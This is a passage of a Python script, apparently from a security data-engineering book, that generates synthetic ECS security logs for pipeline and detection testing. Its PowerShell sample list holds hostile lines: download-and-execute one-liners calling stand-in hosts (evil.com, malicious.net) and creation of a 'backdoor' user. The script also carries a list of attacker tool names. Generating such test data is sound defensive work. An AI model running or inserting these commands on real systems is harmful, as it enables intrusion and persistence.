#!/usr/bin/env python3
"""
Historical Data Generator for Cybersecurity Data Engineering
Generates realistic security logs for historical analysis and pipeline testing.
Covers: Filebeat, Winlogbeat, Sysmon, Rsyslog, Zeek, Suricata, DNS, App logs,
        Firewall, Threat Intel — all in ECS format (Elastic Common Schema).
"""

import json
import random
import datetime
import hashlib
import ipaddress
import os
from pathlib import Path
from typing import Dict, List, Any, Optional
import uuid

# ==================== CONFIGURATION ====================

CONFIG = {
    "output_dir": os.environ.get("OUTPUT_DIR", "../historical_data/"),
    "events_per_day": int(os.environ.get("EVENTS_PER_DAY", 10000)),
    "days_to_generate": int(os.environ.get("DAYS_TO_GENERATE", 30)),
    "start_date": os.environ.get("START_DATE", "2024-01-01"),
    "organizations": ["Business Inc.", "TechCorp", "FinanceCo"],
    "networks": {
        "internal": ["192.168.1.0/24", "192.168.2.0/24", "10.0.0.0/16"],
        "dmz": ["172.16.0.0/24"],
        "external": ["0.0.0.0/0"]
    }
}

# ==================== DATA GENERATOR ====================

class DataGenerator:
    def __init__(self):
        self.start_date = datetime.datetime.strptime(CONFIG["start_date"], "%Y-%m-%d")
        self.employees = self._generate_employees(50)
        self.servers = self._generate_servers(25)
        self.workstations = self._generate_workstations(200)
        self.threat_indicators = self._generate_threat_indicators(100)
        self.hostnames = {
            "linux": [f"ubuntu{i:02d}" for i in range(1, 20)] +
                     [f"centos{i:02d}" for i in range(1, 10)],
            "windows": [f"WIN{i:03d}" for i in range(1, 31)],
            "servers": [f"web{i:02d}" for i in range(1, 10)] +
                       [f"db{i:02d}" for i in range(1, 5)] +
                       [f"app{i:02d}" for i in range(1, 8)]
        }
        self.processes = self._generate_processes()
        self.domain_names = [
            "internal.local", "corp.local", "ad.company.com",
            "evil.com", "malware.net", "phishing.org", "bad-site.io",
            "google.com", "microsoft.com", "github.com", "amazonaws.com"
        ]

    def _generate_employees(self, count: int) -> List[Dict]:
        first_names = ["James", "Maria", "Robert", "Jennifer", "Michael",
                       "Patricia", "William", "Linda", "David", "Barbara",
                       "Alice", "Bob", "Charlie", "Diana", "Eve"]
        last_names = ["Bonifield", "Smith", "Johnson", "Williams", "Brown",
                      "Jones", "Garcia", "Miller", "Davis", "Martinez",
                      "Wilson", "Anderson", "Thomas", "Taylor", "Moore"]
        departments = ["IT", "Finance", "HR", "Sales", "Engineering",
                       "Security", "Marketing", "Operations"]
        employees = []
        for i in range(count):
            first = random.choice(first_names)
            last = random.choice(last_names)
            username = f"{first.lower()}{last[:2].lower()}{random.randint(1, 999)}"
            employees.append({
                "id": f"EMP{random.randint(10000, 99999)}",
                "first_name": first,
                "last_name": last,
                "username": username,
                "email": f"{username}@{random.choice(['company.com', 'internal.local'])}",
                "department": random.choice(departments),
                "manager": random.choice([None, random.randint(1, 50)]),
                "is_admin": random.random() < 0.15
            })
        return employees

    def _generate_servers(self, count: int) -> List[Dict]:
        server_types = ["web", "database", "application", "file", "mail",
                        "dns", "authentication", "logging", "monitoring"]
        return [{
            "name": f"{random.choice(server_types)}{i:02d}.internal.local",
            "type": random.choice(server_types),
            "os": random.choice(["Linux", "Windows Server", "Ubuntu"]),
            "ip": str(ipaddress.IPv4Address(random.randint(0xC0A80100, 0xC0A801FF))),
            "role": random.choice(["production", "development", "testing"]),
            "criticality": random.choice(["critical", "high", "medium", "low"])
        } for i in range(count)]

    def _generate_workstations(self, count: int) -> List[Dict]:
        return [{
            "name": f"WS{random.randint(1000, 9999)}",
            "os": random.choice(["Windows 10", "Windows 11", "Ubuntu 20.04", "macOS"]),
            "ip": str(ipaddress.IPv4Address(random.randint(0xC0A80200, 0xC0A802FF))),
            "user": random.choice(self.employees)["username"],
            "department": random.choice(["IT", "Finance", "HR", "Sales", "Engineering"])
        } for _ in range(count)]

    def _generate_processes(self) -> Dict[str, List[str]]:
        return {
            "windows": [
                "svchost.exe", "explorer.exe", "chrome.exe", "firefox.exe",
                "outlook.exe", "winlogon.exe", "services.exe", "lsass.exe",
                "wininit.exe", "csrss.exe", "smss.exe", "spoolsv.exe",
                "powershell.exe", "cmd.exe", "wscript.exe", "msiexec.exe",
                "regsvr32.exe", "rundll32.exe", "mshta.exe", "wmic.exe"
            ],
            "linux": [
                "sshd", "systemd", "nginx", "apache2", "mysql",
                "postgres", "redis-server", "docker", "python3", "java",
                "bash", "sh", "cron", "rsyslogd", "fail2ban",
                "unattended-upgrade", "snapd", "polkitd", "networkd"
            ],
            "attacker": [
                "mimikatz.exe", "psexec.exe", "nc.exe", "ncat.exe",
                "procdump.exe", "bloodhound.exe", "cobalt_strike.exe",
                "meterpreter.exe", "evil.exe", "backdoor.exe", "shell.exe"
            ]
        }

    def _generate_threat_indicators(self, count: int) -> List[Dict]:
        indicators = []
        for _ in range(count):
            itype = random.choice(["ip", "domain", "hash", "url"])
            indicator = {
                "id": f"INDICATOR_{uuid.uuid4().hex[:8].upper()}",
                "type": itype,
                "severity": random.choice(["critical", "high", "medium", "low"]),
                "source": random.choice(["OpenCTI", "MISP", "AlienVault", "Custom"]),
                "created": datetime.datetime.now().isoformat()
            }
            if itype == "ip":
                indicator["value"] = str(ipaddress.IPv4Address(random.randint(0x01000000, 0xFFFFFFFF)))
                indicator["confidence"] = random.randint(60, 100)
            elif itype == "domain":
                indicator["value"] = f"{random.choice(['api', 'cdn', 'static', 'www'])}.{random.choice(['evil.com', 'malware.net', 'phishing.org'])}"
                indicator["confidence"] = random.randint(70, 100)
            elif itype == "hash":
                indicator["value"] = hashlib.sha256(os.urandom(32)).hexdigest()
                indicator["confidence"] = random.randint(80, 100)
            else:
                indicator["value"] = f"https://evil.{random.choice(['com', 'net', 'org'])}/payload.exe"
                indicator["confidence"] = random.randint(50, 100)
            indicators.append(indicator)
        return indicators

    def get_random_employee(self) -> Dict:
        return random.choice(self.employees)

    def get_random_internal_ip(self) -> str:
        return f"192.168.{random.randint(1, 2)}.{random.randint(1, 254)}"

    def get_random_external_ip(self) -> str:
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def get_random_hostname(self, os_type: Optional[str] = None) -> str:
        if os_type == "windows":
            return random.choice(self.hostnames["windows"])
        elif os_type == "linux":
            return random.choice(self.hostnames["linux"])
        else:
            return random.choice(self.hostnames["servers"])


# ==================== LOG GENERATORS ====================

class LogGenerator:
    """Generates all ECS-compliant security log types for the book's projects."""

    def __init__(self, generator: DataGenerator):
        self.generator = generator
        self.timestamp = datetime.datetime.utcnow().isoformat() + "Z"

    def set_timestamp(self, dt: datetime.datetime):
        self.timestamp = dt.isoformat() + "Z"

    def _base(self, dataset: str, category: str, kind: str = "event") -> Dict:
        return {
            "ecs": {"version": "8.0.0"},
            "event": {
                "kind": kind,
                "dataset": dataset,
                "category": [category],
                "created": self.timestamp
            },
            "@timestamp": self.timestamp
        }

    # ---- Chapter 4: Filebeat / Endpoint & Network Data ----

    def generate_network_log(self) -> Dict[str, Any]:
        """Zeek-style connection log (Ch 4 – network metadata)."""
        src_ip = self.generator.get_random_internal_ip()
        dst_ip = self.generator.get_random_external_ip()
        proto = random.choice(["TCP", "UDP", "ICMP"])
        dst_port = random.choice([80, 443, 22, 25, 53, 3306, 5432, 6379, 3389, 8080]) if proto in ("TCP", "UDP") else None

        log = self._base("zeek.connection", "network")
        log.update({
            "event": {**log["event"], "type": ["connection"], "action": "network-connection"},
            "network": {
                "protocol": proto.lower(),
                "transport": proto.lower(),
                "direction": random.choice(["inbound", "outbound"]),
                "bytes": random.randint(64, 65535),
                "packets": random.randint(1, 200)
            },
            "source": {"ip": src_ip, "port": random.randint(1024, 65535), "address": src_ip},
            "destination": {"ip": dst_ip, "port": dst_port, "address": dst_ip},
            "host": {"name": self.generator.get_random_hostname("linux")}
        })
        return log

    def generate_zeek_dns(self) -> Dict[str, Any]:
        """Zeek DNS log (Ch 4 – DNS telemetry)."""
        qtypes = ["A", "AAAA", "MX", "CNAME", "NS", "TXT", "PTR"]
        rcodes = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}
        rcode_name = random.choices(list(rcodes), weights=[70, 15, 8, 7])[0]
        query = f"{random.choice(['www', 'api', 'mail', 'cdn'])}.{random.choice(self.generator.domain_names)}"

        log = self._base("zeek.dns", "network")
        log.update({
            "event": {**log["event"], "type": ["info"], "action": "dns-query"},
            "dns": {
                "question": {"name": query, "type": random.choice(qtypes), "class": "IN"},
                "response_code": rcode_name,
                "resolved_ip": [self.generator.get_random_external_ip()] if rcode_name == "NOERROR" else [],
                "type": "answer"
            },
            "source": {
                "ip": self.generator.get_random_internal_ip(),
                "port": random.randint(1024, 65535)
            },
            "destination": {"ip": "8.8.8.8", "port": 53},
            "network": {"protocol": "dns", "transport": "udp"},
            "host": {"name": self.generator.get_random_hostname("linux")}
        })
        return log

    def generate_suricata_alert(self) -> Dict[str, Any]:
        """Suricata IDS/IPS alert (Ch 4 – network intrusion detection)."""
        severities = [1, 2, 3]
        categories = [
            "Attempted Administrator Privilege Gain",
            "A Network Trojan was Detected",
            "Potentially Bad Traffic",
            "Attempted Information Leak",
            "Misc Attack",
            "Exploit Kit Activity Detected"
        ]
        sig_ids = [2001219, 2010935, 2027865, 2030171, 2100498, 2013504]

        log = self._base("suricata.alert", "intrusion_detection", kind="alert")
        log.update({
            "event": {**log["event"], "type": ["denied"], "severity": random.choice(severities), "action": "allowed"},
            "rule": {
                "id": str(random.choice(sig_ids)),
                "name": f"ET {random.choice(categories)}",
                "category": random.choice(categories)
            },
            "source": {
                "ip": self.generator.get_random_external_ip(),
                "port": random.randint(1024, 65535)
            },
            "destination": {
                "ip": self.generator.get_random_internal_ip(),
                "port": random.choice([80, 443, 8080, 4444, 9001])
            },
            "network": {
                "protocol": random.choice(["tcp", "udp"]),
                "transport": random.choice(["tcp", "udp"])
            },
            "alert": {
                "signature": f"ET {random.choice(categories)}",
                "signature_id": random.choice(sig_ids),
                "severity": random.choice(severities),
                "category": random.choice(categories)
            },
            "host": {"name": self.generator.get_random_hostname("linux")}
        })
        return log

    def generate_application_log(self) -> Dict[str, Any]:
        """Web application / HTTP access log (Ch 4, 8)."""
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
        status_codes = [200, 201, 204, 301, 302, 400, 401, 403, 404, 500, 502, 503]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "curl/7.68.0", "Python-urllib/3.8", "Go-http-client/1.1"
        ]
        paths = ["/", "/api/v1/users", "/login", "/admin", "/index.html",
                 "/wp-admin/", "/api/v2/data", "/health", "/metrics"]

        log = self._base("application.access", "web")
        log.update({
            "event": {**log["event"], "type": ["access"]},
            "http": {
                "request": {
                    "method": random.choice(methods),
                    "bytes": random.randint(100, 5000),
                    "body": {"bytes": random.randint(0, 2000)}
                },
                "response": {
                    "status_code": random.choice(status_codes),
                    "bytes": random.randint(500, 500000)
                },
                "version": "1.1"
            },
            "url": {
                "path": random.choice(paths),
                "full": f"https://{self.generator.get_random_hostname()}.internal.local{random.choice(paths)}"
            },
            "user_agent": {"original": random.choice(user_agents)},
            "source": {"ip": self.generator.get_random_internal_ip()},
            "host": {"name": self.generator.get_random_hostname("servers")}
        })
        return log

    # ---- Chapter 5: Windows Logs / Winlogbeat ----

    def generate_windows_event(self) -> Dict[str, Any]:
        """Windows Security/System/Application event log (Winlogbeat, Ch 5)."""
        event_map = {
            4624: ("Successful Logon", "authentication"),
            4625: ("Failed Logon", "authentication"),
            4672: ("Special Privileges Assigned", "iam"),
            4688: ("Process Creation", "process"),
            4698: ("Scheduled Task Created", "configuration"),
            4720: ("User Account Created", "iam"),
            4728: ("Member Added to Security Group", "iam"),
            4768: ("Kerberos TGT Request", "authentication"),
            4769: ("Kerberos Service Ticket Request", "authentication"),
            4776: ("NTLM Authentication", "authentication"),
            7045: ("New Service Installed", "configuration"),
            1102: ("Audit Log Cleared", "configuration")
        }
        event_id = random.choice(list(event_map.keys()))
        event_name, category = event_map[event_id]
        employee = self.generator.get_random_employee()
        hostname = self.generator.get_random_hostname("windows")

        log = self._base("windows.security", category)
        log.update({
            "event": {
                **log["event"],
                "code": str(event_id),
                "action": event_name,
                "type": ["info"]
            },
            "winlog": {
                "event_id": event_id,
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": hostname,
                "channel": "Security",
                "process": {
                    "pid": random.randint(100, 9999),
                    "thread": {"id": random.randint(1000, 99999)}
                },
                "record_id": random.randint(100000, 9999999),
                "event_data": self._windows_event_data(event_id, employee)
            },
            "host": {
                "name": hostname,
                "os": {"platform": "windows", "name": "Windows", "version": "10"}
            },
            "user": {
                "name": employee["username"],
                "domain": "CORP",
                "id": employee["id"]
            }
        })
        return log

    def _windows_event_data(self, event_id: int, employee: Dict) -> Dict:
        if event_id in (4624, 4625):
            return {
                "TargetUserName": employee["username"],
                "TargetDomainName": "CORP",
                "LogonType": str(random.choice([2, 3, 4, 5, 7, 10])),
                "IpAddress": self.generator.get_random_internal_ip(),
                "LogonProcessName": random.choice(["User32", "Advapi", "Kerberos", "NtLmSsp"]),
                "AuthenticationPackageName": random.choice(["NTLM", "Kerberos", "Negotiate"])
            }
        elif event_id == 4688:
            proc = random.choice(
                self.generator.processes["windows"] +
                self.generator.processes["attacker"]
            )
            return {
                "NewProcessName": f"C:\\Windows\\System32\\{proc}",
                "NewProcessId": hex(random.randint(0x100, 0xFFFF)),
                "CreatorProcessName": "C:\\Windows\\System32\\svchost.exe",
                "CommandLine": f"{proc} {random.choice(['-s', '-e', '/c', '-nop', '-enc'])} {random.randint(1, 999)}"
            }
        elif event_id == 4672:
            return {
                "SubjectUserName": employee["username"],
                "SubjectDomainName": "CORP",
                "PrivilegeList": "SeSecurityPrivilege\nSeTakeOwnershipPrivilege\nSeDebugPrivilege"
            }
        elif event_id in (4698, 7045):
            return {
                "SubjectUserName": employee["username"],
                "TaskName": f"\\Microsoft\\Windows\\{random.choice(['UpdateOrchestrator', 'WindowsUpdate', 'Defrag'])}\\{uuid.uuid4().hex[:8]}",
                "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command></Exec></Actions></Task>"
            }
        return {"SubjectUserName": employee["username"], "SubjectDomainName": "CORP"}

    def generate_sysmon_event(self) -> Dict[str, Any]:
        """Sysmon event log (Ch 5 – enhanced Windows endpoint telemetry)."""
        sysmon_events = {
            1: "Process Create",
            3: "Network Connect",
            7: "Image Loaded",
            8: "CreateRemoteThread",
            10: "ProcessAccess",
            11: "FileCreate",
            12: "RegistryEvent (Object create and delete)",
            13: "RegistryEvent (Value Set)",
            15: "FileCreateStreamHash",
            22: "DnsQuery",
            23: "FileDelete"
        }
        event_id = random.choice(list(sysmon_events.keys()))
        hostname = self.generator.get_random_hostname("windows")
        employee = self.generator.get_random_employee()
        proc = random.choice(self.generator.processes["windows"] + self.generator.processes["attacker"])
        file_hash = hashlib.sha256(os.urandom(32)).hexdigest()

        log = self._base("sysmon.operational", "process")
        log.update({
            "event": {
                **log["event"],
                "code": str(event_id),
                "action": sysmon_events[event_id],
                "type": ["start"] if event_id == 1 else ["info"]
            },
            "winlog": {
                "event_id": event_id,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": hostname,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "record_id": random.randint(100000, 9999999),
                "event_data": self._sysmon_event_data(event_id, proc, employee, file_hash)
            },
            "process": {
                "name": proc,
                "pid": random.randint(100, 65535),
                "hash": {"sha256": file_hash},
                "executable": f"C:\\Windows\\System32\\{proc}",
                "command_line": f"{proc} {random.choice(['-enc', '/c', '-nop'])} {uuid.uuid4().hex[:16]}"
            },
            "host": {
                "name": hostname,
                "os": {"platform": "windows", "name": "Windows"}
            },
            "user": {"name": employee["username"], "domain": "CORP"}
        })
        return log

    def _sysmon_event_data(self, event_id: int, proc: str, employee: Dict, file_hash: str) -> Dict:
        base = {
            "Image": f"C:\\Windows\\System32\\{proc}",
            "User": f"CORP\\{employee['username']}",
            "Hashes": f"SHA256={file_hash}"
        }
        if event_id == 1:
            parent = random.choice(self.generator.processes["windows"])
            base.update({
                "CommandLine": f"{proc} -enc {uuid.uuid4().hex}",
                "ParentImage": f"C:\\Windows\\System32\\{parent}",
                "ParentCommandLine": parent,
                "IntegrityLevel": random.choice(["Low", "Medium", "High", "System"])
            })
        elif event_id == 3:
            base.update({
                "DestinationIp": self.generator.get_random_external_ip(),
                "DestinationPort": str(random.choice([80, 443, 4444, 8080, 1337])),
                "SourceIp": self.generator.get_random_internal_ip(),
                "SourcePort": str(random.randint(1024, 65535)),
                "Protocol": "tcp"
            })
        elif event_id == 22:
            base.update({
                "QueryName": f"{random.choice(['api', 'cdn', 'www'])}.{random.choice(self.generator.domain_names)}",
                "QueryStatus": random.choice(["0", "9003"])
            })
        elif event_id in (12, 13):
            base.update({
                "TargetObject": f"HKLM\\SOFTWARE\\{random.choice(['Microsoft\\Windows\\CurrentVersion\\Run', 'Classes\\CLSID', 'Policies\\System'])}\\{uuid.uuid4().hex[:8]}",
                "Details": f"C:\\Windows\\System32\\{proc}"
            })
        return base

    def generate_powershell_scriptblock(self) -> Dict[str, Any]:
        """PowerShell Script Block Logging event (Ch 5, Event ID 4104)."""
        hostname = self.generator.get_random_hostname("windows")
        employee = self.generator.get_random_employee()
        # Simulate both benign and suspicious PS script blocks
        scripts = [
            "Get-Process | Where-Object {$_.CPU -gt 100}",
            "Set-ExecutionPolicy RemoteSigned -Force",
            "Import-Module ActiveDirectory; Get-ADUser -Filter *",
            "Invoke-WebRequest -Uri 'http://evil.com/payload.ps1' -OutFile $env:TEMP\\p.ps1",
            "IEX (New-Object Net.WebClient).DownloadString('http://malicious.net/shell')",
            "[System.Convert]::FromBase64String('JABjACAAPQAgACcAZQBjAGgAbwAgACcA')",
            "Get-EventLog -LogName Security -Newest 100",
            "New-LocalUser -Name 'backdoor' -Password (ConvertTo-SecureString 'P@ss!' -AsPlainText -Force)"
        ]

        log = self._base("windows.powershell", "process")
        log.update({
            "event": {
                **log["event"],
                "code": "4104",
                "action": "ScriptBlock Logged",
                "type": ["info"]
            },
            "winlog": {
                "event_id": 4104,
                "provider_name": "Microsoft-Windows-PowerShell",
                "computer_name": hostname,
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "record_id": random.randint(100000, 9999999),
                "event_data": {
                    "ScriptBlockText": random.choice(scripts),
                    "Path": random.choice(["", f"C:\\Users\\{employee['username']}\\Documents\\script.ps1"]),
                    "MessageNumber": "1",
                    "MessageTotal": "1"
                }
            },
            "host": {"name": hostname, "os": {"platform": "windows"}},
            "user": {"name": employee["username"], "domain": "CORP"}
        })
        return log

    # ---- Chapter 7: Syslog / Rsyslog Data ----

    def generate_linux_syslog(self) -> Dict[str, Any]:
        """Linux syslog event in ECS format (Ch 7 – Rsyslog)."""
        facilities = {
            "kern": 0, "user": 1, "mail": 2, "daemon": 3,
            "auth": 4, "syslog": 5, "lpr": 6, "cron": 9, "local0": 16
        }
        severity_labels = ["emerg", "alert", "crit", "err", "warning", "notice", "info", "debug"]
        facility_name = random.choice(list(facilities.keys()))
        severity = random.choices(range(8), weights=[1, 1, 2, 3, 5, 8, 50, 10])[0]
        facility_num = facilities[facility_name]
        priority = (facility_num * 8) + severity
        hostname = self.generator.get_random_hostname("linux")
        employee = self.generator.get_random_employee()

        messages = {
            "auth": [
                f"sshd[{random.randint(1000,9999)}]: Accepted publickey for {employee['username']} from {self.generator.get_random_internal_ip()} port {random.randint(1024,65535)} ssh2",
                f"sshd[{random.randint(1000,9999)}]: Failed password for {employee['username']} from {self.generator.get_random_external_ip()} port {random.randint(1024,65535)} ssh2",
                f"sudo:  {employee['username']} : TTY=pts/{random.randint(0,9)} ; PWD=/home/{employee['username']} ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
                f"useradd[{random.randint(1000,9999)}]: new user: name={employee['username']}, UID={random.randint(1000,9999)}, GID={random.randint(1000,9999)}"
            ],
            "kern": [
                f"kernel: iptables: IN=eth0 OUT= SRC={self.generator.get_random_external_ip()} DST={self.generator.get_random_internal_ip()} PROTO=TCP DPT={random.choice([22,80,443,3389])} DROP",
                f"kernel: eth{random.randint(0,3)}: renamed from veth{uuid.uuid4().hex[:8]}",
                f"kernel: OOM killer triggered for pid {random.randint(1000,9999)}"
            ],
            "daemon": [
                f"systemd[1]: Started {random.choice(['nginx.service','mysql.service','docker.service','sshd.service'])}.",
                f"systemd[1]: Unit {random.choice(['network.service','rsyslog.service'])} entered failed state.",
                f"rsyslogd: {random.randint(1,5)} messages suppressed"
            ],
            "cron": [
                f"CRON[{random.randint(1000,9999)}]: (root) CMD (/usr/bin/logrotate -f /etc/logrotate.conf)",
                f"CRON[{random.randint(1000,9999)}]: (www-data) CMD (/usr/bin/php /var/www/html/cron.php)"
            ]
        }

        msg = random.choice(messages.get(facility_name, messages["daemon"]))
        proc_name = msg.split("[")[0].split(":")[0] if ":" in msg or "[" in msg else "kernel"

        log = self._base("linux.syslog", "system")
        log.update({
            "event": {**log["event"], "severity": severity, "type": ["info"]},
            "log": {
                "syslog": {
                    "priority": priority,
                    "facility": {"code": facility_num, "name": facility_name},
                    "severity": {"code": severity, "name": severity_labels[severity]}
                }
            },
            "host": {"name": hostname, "os": {"platform": "linux"}},
            "process": {
                "name": proc_name,
                "pid": random.randint(1000, 9999)
            },
            "message": msg
        })
        return log

    def generate_rsyslog_structured(self) -> Dict[str, Any]:
        """Structured syslog with key-value pairs (Ch 7 – advanced Rsyslog format)."""
        hostname = self.generator.get_random_hostname("linux")
        employee = self.generator.get_random_employee()
        src_ip = self.generator.get_random_internal_ip()
        dst_ip = self.generator.get_random_external_ip()

        log = self._base("linux.syslog.structured", "network")
        log.update({
            "event": {**log["event"], "type": ["connection"]},
            "message": f"CEF:0|Rsyslog|SecurityEvent|1.0|{random.randint(100,999)}|Network Connection|{random.randint(1,10)}|src={src_ip} dst={dst_ip} spt={random.randint(1024,65535)} dpt={random.choice([80,443,22,53])} proto=TCP act={random.choice(['PERMIT','DENY'])} dvchost={hostname}",
            "host": {"name": hostname, "os": {"platform": "linux"}},
            "source": {"ip": src_ip, "user": {"name": employee["username"]}},
            "destination": {"ip": dst_ip}
        })
        return log

    # ---- Chapter 6: Firewall / Iptables ----

    def generate_firewall_log(self) -> Dict[str, Any]:
        """Iptables/firewall log (Ch 6 – network metadata)."""
        actions = ["ACCEPT", "DROP", "REJECT"]
        action = random.choice(actions)

        log = self._base("firewall.iptables", "network")
        log.update({
            "event": {
                **log["event"],
                "type": ["denied" if action != "ACCEPT" else "allowed"],
                "action": action.lower()
            },
            "network": {
                "protocol": random.choice(["tcp", "udp", "icmp"]),
                "transport": random.choice(["tcp", "udp"])
            },
            "source": {
                "ip": self.generator.get_random_external_ip(),
                "port": random.randint(1024, 65535),
                "mac": ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
            },
            "destination": {
                "ip": self.generator.get_random_internal_ip(),
                "port": random.choice([22, 80, 443, 53, 123, 3306, 3389])
            },
            "rule": {
                "id": f"FW{random.randint(1000, 9999)}",
                "name": f"iptables-{random.choice(['INPUT', 'OUTPUT', 'FORWARD'])}"
            },
            "host": {"name": self.generator.get_random_hostname("linux")}
        })
        return log

    # ---- Chapter 13: Threat Intelligence (Redis/Memcached caching) ----

    def generate_threat_intel_feed(self) -> Dict[str, Any]:
        """Threat intelligence indicator (Ch 13 – CTI enrichment pipeline)."""
        indicator = random.choice(self.generator.threat_indicators)

        log = self._base("threatintel.indicator", "threat", kind="enrichment")
        log.update({
            "event": {**log["event"], "type": ["indicator"]},
            "threat": {
                "indicator": {
                    "first_seen": self.timestamp,
                    "last_seen": self.timestamp,
                    "modified_at": self.timestamp,
                    "marking": {"tlp": random.choice(["WHITE", "GREEN", "AMBER", "RED"])},
                    "provider": indicator["source"],
                    "type": indicator["type"],
                    "ip": indicator["value"] if indicator["type"] == "ip" else None,
                    "domain": indicator["value"] if indicator["type"] == "domain" else None,
                    "file": {"hash": {"sha256": indicator["value"]}} if indicator["type"] == "hash" else None,
                    "url": {"full": indicator["value"]} if indicator["type"] == "url" else None,
                    "confidence": indicator.get("confidence", 80),
                    "description": f"Malicious {indicator['type']} reported by {indicator['source']}"
                },
                "feed": {"name": indicator["source"], "reference": f"https://threatintel.example/{indicator['id']}"},
                "tactic": {
                    "name": random.choice(["Initial Access", "Execution", "Persistence", "Lateral Movement", "Exfiltration"]),
                    "id": f"TA{random.randint(1000, 1050)}"
                },
                "technique": {
                    "name": random.choice(["Phishing", "Command and Scripting Interpreter", "Valid Accounts"]),
                    "id": f"T{random.randint(1000, 1600)}"
                }
            }
        })
        return log

    def generate_kafka_pipeline_event(self) -> Dict[str, Any]:
        """Event with Kafka routing metadata (Ch 10 – data centralization)."""
        base = random.choice([
            self.generate_network_log,
            self.generate_windows_event,
            self.generate_linux_syslog,
            self.generate_firewall_log
        ])()
        base["pipeline"] = {
            "kafka": {
                "topic": random.choice(["security-windows", "security-linux", "security-network", "threat-intel"]),
                "partition": random.randint(0, 3),
                "offset": random.randint(0, 1000000),
                "consumer_group": "logstash-security"
            },
            "stage": "centralization"
        }
        return base

    def generate_logstash_enriched(self) -> Dict[str, Any]:
        """Event enriched by Logstash filters (Ch 8, 9 – transformation pipeline)."""
        base = random.choice([
            self.generate_network_log,
            self.generate_firewall_log,
            self.generate_suricata_alert
        ])()
        # Simulate Logstash grok/cidr/translate enrichment
        src_ip = base.get("source", {}).get("ip", self.generator.get_random_internal_ip())
        is_internal = src_ip.startswith("192.168.") or src_ip.startswith("10.")
        base["enrichment"] = {
            "source_network": "internal" if is_internal else "external",
            "geo": {} if is_internal else {
                "country_iso_code": random.choice(["US", "RU", "CN", "DE", "FR", "BR"]),
                "city_name": random.choice(["New York", "Moscow", "Beijing", "Berlin"]),
                "location": {"lon": round(random.uniform(-180, 180), 4),
                             "lat": round(random.uniform(-90, 90), 4)}
            },
            "threat_matched": random.random() < 0.05,
            "logstash_pipeline": "security-enrichment",
            "logstash_version": "8.11.0"
        }
        return base


# ==================== HISTORICAL GENERATOR ====================

class HistoricalDataGenerator:

    LOG_WEIGHTS = {
        "network": 0.18,
        "zeek_dns": 0.08,
        "suricata": 0.05,
        "windows": 0.14,
        "sysmon": 0.10,
        "powershell": 0.04,
        "linux_syslog": 0.14,
        "rsyslog_structured": 0.04,
        "firewall": 0.08,
        "threat_intel": 0.04,
        "application": 0.07,
        "kafka_pipeline": 0.02,
        "logstash_enriched": 0.02
    }

    def __init__(self):
        self.generator = DataGenerator()
        self.log_gen = LogGenerator(self.generator)
        self.output_dir = Path(CONFIG["output_dir"])
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def _pick_log_type(self) -> str:
        return random.choices(
            list(self.LOG_WEIGHTS.keys()),
            weights=list(self.LOG_WEIGHTS.values())
        )[0]

    def _generate_entry(self, log_type: str) -> Dict:
        dispatch = {
            "network": self.log_gen.generate_network_log,
            "zeek_dns": self.log_gen.generate_zeek_dns,
            "suricata": self.log_gen.generate_suricata_alert,
            "windows": self.log_gen.generate_windows_event,
            "sysmon": self.log_gen.generate_sysmon_event,
            "powershell": self.log_gen.generate_powershell_scriptblock,
            "linux_syslog": self.log_gen.generate_linux_syslog,
            "rsyslog_structured": self.log_gen.generate_rsyslog_structured,
            "firewall": self.log_gen.generate_firewall_log,
            "threat_intel": self.log_gen.generate_threat_intel_feed,
            "application": self.log_gen.generate_application_log,
            "kafka_pipeline": self.log_gen.generate_kafka_pipeline_event,
            "logstash_enriched": self.log_gen.generate_logstash_enriched
        }
        return dispatch[log_type]()

    def generate_day(self, date: datetime.datetime, events_per_day: int = None):
        events_per_day = events_per_day or CONFIG["events_per_day"]
        daily_data: Dict[str, list] = {k: [] for k in self.LOG_WEIGHTS}

        for _ in range(events_per_day):
            hour = random.randint(0, 23)
            ts = date.replace(
                hour=hour,
                minute=random.randint(0, 59),
                second=random.randint(0, 59),
                microsecond=random.randint(0, 999999)
            )
            self.log_gen.set_timestamp(ts)
            log_type = self._pick_log_type()
            daily_data[log_type].append(self._generate_entry(log_type))

        date_str = date.strftime("%Y-%m-%d")
        for log_type, entries in daily_data.items():
            if not entries:
                continue
            out_file = self.output_dir / f"{log_type}_{date_str}.ndjson"
            with open(out_file, "w", encoding="utf-8") as f:
                for entry in entries:
                    f.write(json.dumps(entry) + "\n")

        total = sum(len(v) for v in daily_data.values())
        print(f"Generated {total} events for {date_str}")
        return daily_data

    def generate_historical_range(self, start_date: datetime.datetime, days: int):
        for i in range(days):
            self.generate_day(start_date + datetime.timedelta(days=i))

    def generate_attack_scenario(self, date: datetime.datetime, scenario: str = "apt"):
        """
        Generate multi-stage attack scenarios:
        - apt: Advanced Persistent Threat kill chain
        - ransomware: Ransomware infection and encryption
        - data_exfil: Data exfiltration via DNS tunnelling
        - cred_theft: Credential harvesting
        """
        scenarios = {
            "apt": self._scenario_apt,
            "ransomware": self._scenario_ransomware,
            "data_exfil": self._scenario_data_exfiltration,
            "cred_theft": self._scenario_credential_theft
        }
        fn = scenarios.get(scenario, self._scenario_apt)
        logs = fn(date)
        out_file = self.output_dir / f"attack_{scenario}_{date.strftime('%Y-%m-%d')}.ndjson"
        with open(out_file, "w", encoding="utf-8") as f:
            for entry in logs:
                f.write(json.dumps(entry) + "\n")
        print(f"  Attack scenario '{scenario}' → {len(logs)} events → {out_file.name}")
        return logs

    def _scenario_apt(self, date: datetime.datetime) -> List[Dict]:
        """Multi-stage APT kill chain: recon → brute-force → initial access → lateral movement → exfil."""
        logs = []
        employee = self.generator.get_random_employee()
